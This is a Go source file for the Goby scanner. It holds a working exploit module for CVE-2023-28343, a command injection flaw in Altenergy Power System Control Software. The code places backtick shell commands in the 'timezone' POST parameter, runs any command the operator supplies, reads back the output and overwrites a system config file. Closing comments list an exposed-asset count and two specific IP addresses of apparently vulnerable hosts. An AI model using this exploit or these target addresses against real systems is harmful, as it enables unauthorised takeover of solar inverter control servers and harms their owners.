package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Altenergy Power System Control Software set_timezone RCE Vulnerability (CVE-2023-28343)",
    "Description": "<p>Altenergy Power System Control Software is a microinverter control software from Altenergy Power System.</p><p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.</p>",
    "Product": "Altenergy-Power-System-Control-Software",
    "Homepage": "https://apsystems.com/",
    "DisclosureDate": "2023-03-15",
    "Author": "h1ei1",
    "FofaQuery": "body=\"Altenergy Power Control Software\"",
    "GobyQuery": "body=\"Altenergy Power Control Software\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released any repair measures to solve this security problem. Users who use this software are advised to pay attention to the manufacturer's homepage or refer to the website for solutions: <a href=\"https://apsystems.com/.\">https://apsystems.com/.</a></p>",
    "References": [
        "https://github.com/ahmedalroky/Disclosures/blob/main/apesystems/os_command_injection.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-28343"
    ],
    "CNNVD": [
        "CNNVD-202303-1096"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Altenergy Power System Control Software set_timezone 远程命令执行漏洞（CVE-2023-28343）",
            "Product": "Altenergy-Power-System-Control-Software",
            "Description": "<p>Altenergy Power System Control Software是Altenergy Power System公司的微型逆变器控制软件。<br></p><p>AlAltenergy Power System Control Software C1.2.5版本存在安全漏洞，该漏洞源于/set_timezone存在操作系统命令注入漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://apsystems.com/\">https://apsystems.com/</a>。<br></p>",
            "Impact": "<p>AlAltenergy Power System Control Software C1.2.5版本存在安全漏洞，该漏洞源于/set_timezone存在操作系统命令注入漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Altenergy Power System Control Software set_timezone RCE Vulnerability (CVE-2023-28343)",
            "Product": "Altenergy-Power-System-Control-Software",
            "Description": "<p>Altenergy Power System Control Software is a microinverter control software from Altenergy Power System.<br></p><p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has not released any repair measures to solve this security problem. Users who use this software are advised to pay attention to the manufacturer's homepage or refer to the website for solutions: <a href=\"https://apsystems.com/.\">https://apsystems.com/.</a><br></p>",
            "Impact": "<p>There is a security vulnerability in AlAltenergy Power System Control Software C1.2.5, which is caused by an operating system command injection vulnerability in /set_timezone. An attacker can execute arbitrary commands to obtain server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7372"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(6)
			uri := "/index.php/management/set_timezone"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
      cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("timezone=`123|md5sum > %s.txt`", randStr)
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {

				uri2 := fmt.Sprintf("/%s.txt", randStr)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					uri3 := "/index.php/management/set_timezone"
					cfg3 := httpclient.NewPostRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
          cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg3.Data = "timezone=`echo Asia/Taipei > /etc/yuneng/timezone.conf`"
					if _, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
					}

					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "d41d8cd98f00b204e9800998ecf8427e")
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)

			randStr := goutils.RandomHexString(6)
			uri := "/index.php/management/set_timezone"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
      cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("timezone=`%s > %s.txt`", cmd,randStr)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {

				uri2 := fmt.Sprintf("/%s.txt", randStr)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					uri3 := "/index.php/management/set_timezone"
					cfg3 := httpclient.NewPostRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
          cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg3.Data = "timezone=`echo Asia/Taipei > /etc/yuneng/timezone.conf`"
					if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
					}
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}
//hunter近一年资产1745
//http://82.65.60.193:888
//http://24.246.63.221